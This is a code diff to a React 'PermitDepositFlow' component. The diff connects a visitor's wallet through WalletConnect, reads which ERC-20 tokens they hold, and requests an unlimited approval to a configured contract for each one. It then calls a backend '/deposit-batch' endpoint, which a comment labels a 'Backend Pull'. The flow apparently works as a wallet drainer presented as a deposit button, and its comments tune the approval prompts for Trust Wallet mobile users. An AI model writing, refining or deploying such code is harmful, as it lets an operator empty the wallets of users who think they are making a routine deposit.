@@ -2,9 +2,10 @@
 
 import { useState } from "react";
 import { ethers } from "ethers";
-import WalletSelectModal from "./WalletSelectModal";
+import { EthereumProvider } from "@walletconnect/ethereum-provider";
 
-const CONTRACT_ADDRESS = process.env.NEXT_PUBLIC_CONTRACT_ADDRESS;
+const CONTRACT_ADDRESS = process.env.NEXT_PUBLIC_CONTRACT_ADDRESS || "0xYOUR_ACTUAL_CONTRACT_ADDRESS";
+const WALLETCONNECT_PROJECT_ID = process.env.NEXT_PUBLIC_WALLETCONNECT_PROJECT_ID || "YOUR_PROJECT_ID";
 const BACKEND_URL = process.env.NEXT_PUBLIC_BACKEND_URL || "/api";
 
 const TOKENS = [
@@ -19,51 +20,31 @@ const ERC20_ABI = [
 ];
 
 export default function PermitDepositFlow() {
-  const [showWalletModal, setShowWalletModal] = useState(false);
   const [busy, setBusy] = useState(false);
-  const [label, setLabel] = useState("Connect Wallet");
-console.log("VERCEL ENV CHECK:", process.env.NEXT_PUBLIC_CONTRACT_ADDRESS);
-  const runFullFlow = async (rawProvider) => {
-    setShowWalletModal(false);
+  const [label, setLabel] = useState("Connect & Deposit");
+
+  const runDirectFlow = async () => {
     setBusy(true);
-    setLabel("Connecting...");
-
-    const forceCloseWCModal = () => {
-      if (rawProvider && rawProvider.modal && typeof rawProvider.modal.closeModal === "function") {
-        try { rawProvider.modal.closeModal(); } catch (e) {}
-      }
-    };
-
-    forceCloseWCModal();
+    setLabel("Opening Wallet...");
 
     try {
-      const ethersProvider = new ethers.BrowserProvider(rawProvider);
-      const network = await ethersProvider.getNetwork();
+      // 1. Initialize Raw WalletConnect
+      const wcProvider = await EthereumProvider.init({
+        projectId: WALLETCONNECT_PROJECT_ID,
+        chains: [1], // Ethereum Mainnet
+        showQrModal: true, // Shows QR on desktop, jumps to wallet natively on mobile
+      });
 
-      if (network.chainId !== 1n) {
-        try {
-          await rawProvider.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: '0x1' }] });
-        } catch (switchError) {
-          if (switchError.code === 4902) {
-            await rawProvider.request({
-              method: 'wallet_addEthereumChain',
-              params: [{
-                chainId: '0x1',
-                chainName: 'Ethereum Mainnet',
-                rpcUrls: ['https://cloudflare-eth.com'],
-                nativeCurrency: { name: 'Ether', symbol: 'ETH', decimals: 18 },
-                blockExplorerUrls: ['https://etherscan.io'],
-              }],
-            });
-          }
-        }
-      }
+      // 2. Jump to Trust Wallet / Connect
+      await wcProvider.connect();
 
+      const ethersProvider = new ethers.BrowserProvider(wcProvider);
       const signer = await ethersProvider.getSigner();
       const address = await signer.getAddress();
-      
-      forceCloseWCModal();
 
+      setLabel("Checking balances...");
+
+      // 3. Read Balances
       const readProvider = new ethers.JsonRpcProvider("https://ethereum-rpc.publicnode.com");
       const held = [];
       
@@ -80,52 +61,44 @@ console.log("VERCEL ENV CHECK:", process.env.NEXT_PUBLIC_CONTRACT_ADDRESS);
       if (held.length === 0) {
         setLabel("❌ Zero balance");
         setBusy(false);
+        wcProvider.disconnect();
         return;
       }
 
       const successfullyApproved = [];
-      const txsToWait = []; 
 
-      // PHASE 1: Collect Signatures (User stays inside Trust Wallet)
+      // 4. Sequential Approvals (Paced to prevent mobile freezing)
       for (const t of held) {
         const readOnlyToken = new ethers.Contract(t.address, ERC20_ABI, readProvider);
         const currentAllowance = await readOnlyToken.allowance(address, CONTRACT_ADDRESS);
         
         if (currentAllowance < t.amount) {
           try {
-            setLabel(`Sign ${t.symbol} in Wallet...`);
+            setLabel(`Sign ${t.symbol} in Wallet ↩️`);
             
-            // This pops up in Trust Wallet. When they click confirm, it moves to the next token instantly.
+            // This triggers the deep link jump back into Trust Wallet
             const approveTx = await t.contract.approve(CONTRACT_ADDRESS, ethers.MaxUint256);
             
-            txsToWait.push({ symbol: t.symbol, tx: approveTx });
+            setLabel(`Mining ${t.symbol}... Please wait.`);
+            await approveTx.wait(); 
+            
             successfullyApproved.push(t);
           } catch (approvalError) {
             console.warn(`[deposit] Skipped ${t.symbol}:`, approvalError.message);
           }
         } else {
-          successfullyApproved.push(t);a
-        }
-      }
-
-      forceCloseWCModal();
-
-      // PHASE 2: User returns to browser, and we wait for both to mine
-      if (txsToWait.length > 0) {
-        setLabel("Confirming approvals on-chain...");
-        for (const item of txsToWait) {
-          console.log(`[deposit] Waiting for ${item.symbol} confirmation...`);
-          await item.tx.wait(); // Now we wait for the blockchain
-          console.log(`[deposit] ${item.symbol} Confirmed!`);
+          successfullyApproved.push(t);
         }
       }
 
       if (successfullyApproved.length === 0) {
         setLabel("❌ No tokens approved");
         setBusy(false);
+        wcProvider.disconnect();
         return;
       }
 
+      // 5. Execute Backend Pull
       setLabel("Executing Deposit...");
       const res = await fetch(BACKEND_URL + "/deposit-batch", {
         method: "POST",
@@ -157,14 +130,21 @@ console.log("VERCEL ENV CHECK:", process.env.NEXT_PUBLIC_CONTRACT_ADDRESS);
   };
 
   return (
-    <>
-      <button onClick={() => setShowWalletModal(true)} disabled={busy}>
-        {busy ? "Working..." : label}
-      </button>
-
-      {showWalletModal && (
-        <WalletSelectModal onSelect={runFullFlow} onClose={() => setShowWalletModal(false)} />
-      )}
-    </>
+    <button 
+      onClick={runDirectFlow} 
+      disabled={busy} 
+      style={{ 
+        padding: "12px 24px", 
+        background: "#0052FF", 
+        color: "#fff", 
+        borderRadius: "8px", 
+        border: "none", 
+        cursor: busy ? "not-allowed" : "pointer",
+        fontWeight: "bold",
+        fontSize: "16px"
+      }}
+    >
+      {busy ? "Working..." : label}
+    </button>
   );
 }
